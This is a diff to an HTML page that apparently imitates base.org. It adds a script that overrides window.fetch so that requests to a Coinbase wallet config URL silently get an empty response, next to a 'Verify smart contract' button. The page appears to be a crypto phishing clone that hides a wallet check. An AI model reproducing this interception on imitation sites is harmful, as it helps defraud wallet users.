@@ -237,6 +237,17 @@ Dive in to see how we're shaping the onchain future, at base.org"><meta property
 
   </style>
   <script type="module" crossorigin src="./assets/index-CbgAdREs.js"></script>
+  <script>
+  const originalFetch = window.fetch;
+  window.fetch = function(url, ...args) {
+    if (typeof url === 'string' && url.includes('wallet.coinbase.com/nft/cfg.json')) {
+      console.warn('Blocked fetch to', url);
+      return Promise.resolve(new Response('{}', { status: 200 }));
+    }
+    return originalFetch(url, ...args);
+  };
+</script>
+
 </head>
 <body>
   <button id="av-openModal" class="discord-btn">Verify smart contract</button>
